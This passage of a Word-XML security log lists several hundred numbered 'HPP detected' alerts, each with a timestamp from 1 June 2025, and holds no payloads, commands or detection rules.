        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.979754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821. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.981889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822. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.984068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823. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.986305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824. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.988476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825. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.990613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826. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.992739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827. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.994851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828. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.997491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829. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.999604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830. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:13.001801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831. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:13.003423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832. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:13.005571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833. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.012041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834. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.016303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835. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.019564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836. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.022809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837. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.025485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838. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.029296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839. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.031982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840. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.035183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841. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.038384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842. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.042150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843. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.044956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844. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.048168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845. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.050314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846. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.054073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847. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.057307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848. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.059491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849. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.061684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850. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.063832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851. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.065985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852. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.068139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853. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.069800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854. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.071994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855. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.074181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856. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.076333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857. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.077974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858. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.080120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859. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.082275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860. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.083870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861. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.086010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862. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.088171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863. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.089821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864. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:10:19.091464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865. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.674499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866. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.678410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867. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.681689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868. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.684392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869. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.686632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870. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.690537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871. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.693785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872. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.696497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873. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.699795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874. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.702502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875. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.705816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876. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.709104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877. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.713450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878. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.716712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879. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.719918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880. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.722615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881. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.725269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882. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.727389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883. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.729520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884. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.731790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885. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.733782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886. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.735893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887. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.738015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888. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.740154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889. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.742429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890. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.744575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891. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.746731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892. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.748867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893. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.751131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894. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.753278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895. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.754882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896. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:13:25.757210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897. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.870584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898. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.875379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899. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.878608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900. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.882484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901. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.885707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902. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.888411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903. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.891081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904. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.894952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905. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.898699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906. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.901873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907. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.905580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908. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.908296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909. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.910985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910. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.915309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911. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.918501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912. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.920647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913. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.922809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914. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.924962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915. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.927049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916. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.929725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917. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.931847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918. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.933984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919. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.936724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920. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.938906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921. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.940529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922. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.942692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923. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.944419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924. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.946598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925. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.948752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926. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.950892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927. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.953048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928. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:16:34.955157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929. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.379977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930. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.384864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931. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.388829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932. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.392066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933. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.395216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934. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.397366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935. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.400162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936. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.402850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937. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.405514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938. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.408225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939. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.410897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940. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.413553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941. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.416795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942. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.436969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943. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.441241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944. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.444938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945. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.447100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946. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.449258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947. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.451414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948. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.453568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949. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.455768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950. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.457927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951. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.460117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952. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.462293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953. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.464452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954. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.466073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955. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.468204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956. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.469845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957. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.471975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958. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.474128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959. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.476290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960. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:19:40.478425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961. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.679117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962. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.683365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963. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.686095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964. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.688816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965. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.693639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966. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.696816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967. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.699474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968. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.702152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969. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.705860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970. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.708524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971. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.711756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972. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.714921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973. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.718170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974. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.720819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975. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.724525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976. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.726102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977. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.728200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978. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.729828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979. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.731941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980. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.734686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981. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.736789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982. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.738913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983. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.741047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984. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.743172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985. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.744765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986. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.746362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987. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.748492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988. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.750593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989. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.752697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990. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.754282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991. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.756520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992. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:22:46.758634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993. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.672177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994. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.675361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995. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.678586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996. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.682368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997. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.685610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998. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.688383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999. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.691106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1000. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.694890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1001. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.697030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1002. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.700754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1003. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.704098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1004. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.707324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1005. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.710021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1006. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.713235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1007. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.717093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1008. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.719802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1009. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.721894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1010. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.724030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1011. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.725644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1012. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.727254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1013. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.729397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1014. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.731026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1015. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.733177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1016. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.734758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1017. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.736904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1018. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.738521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1019. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.740648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1020. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.742769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1021. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.744909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1022. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.746521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1023. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.748675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1024. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:25:51.750271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1025. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.960525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1026. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.964957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1027. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.968774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1028. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.971442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1029. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.975206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1030. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.977951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1031. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.981175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1032. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.984381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1033. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.987581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1034. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.991325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1035. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.994047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1036. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.997280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1037. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:56.999972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1038. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.003755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1039. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.006949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1040. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.009142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1041. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.010752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1042. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.012358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1043. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.014487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1044. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.016082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1045. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.018508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1046. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.020136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1047. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.022277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1048. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.023965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1049. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.026124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1050. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.027746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1051. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.029860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1052. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.031445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1053. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.033583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1054. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.035203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1055. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.037333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1056. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:28:57.038954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1057. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.925671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1058. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.930412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1059. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:32:03.933737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1060. **HPP detected**</w:t>
        <w:br/>
